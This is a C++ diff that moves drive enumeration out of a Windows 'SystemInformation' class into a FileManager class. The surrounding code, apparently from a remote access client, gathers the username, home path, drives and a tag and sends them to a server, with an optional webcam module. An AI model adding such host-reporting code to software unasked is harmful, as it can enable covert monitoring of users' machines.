@@ -40,21 +40,6 @@ std::string SystemInformation::getWindowsVersion() {
 }
 
 
-std::vector<std::string> SystemInformation::getDisks() {
-    DWORD dwSize = MAX_PATH;
-    char szLogicalDrives[MAX_PATH] = {0};
-    DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);
-    std::vector<std::string> diskVector;
-    if (dwResult > 0 && dwResult <= MAX_PATH) {
-        char *szSingleDrive = szLogicalDrives;
-        while (*szSingleDrive) {
-            diskVector.emplace_back(szSingleDrive);
-            szSingleDrive += strlen(szSingleDrive) + 1;
-        }
-    }
-    return diskVector;
-}
-
 std::string SystemInformation::getUsername() {
     char username[UNLEN + 1];
     DWORD username_len = UNLEN + 1;
@@ -79,7 +64,7 @@ std::vector<std::string> SystemInformation::getSystemInformation() {
     informationVector.emplace_back(getenv("HOMEPATH"));
     informationVector.emplace_back(getenv("HOMEDRIVE"));
     informationVector.push_back(getUsername());
-    informationVector.push_back(vector2string(getDisks()));
+    informationVector.push_back(vector2string(FileManager::getDisks()));
     informationVector.emplace_back(TAG_NAME);
     // Add or not modules to server
 #ifdef WEBCAM
@@ -95,9 +80,7 @@ std::vector<std::string> SystemInformation::getSystemInformation() {
     return informationVector;
 }
 
-void SystemInformation::sendDisks(){
-    stream.sendList(getDisks());
-}
+
 
 void SystemInformation::send() {
     stream.sendList(getSystemInformation());
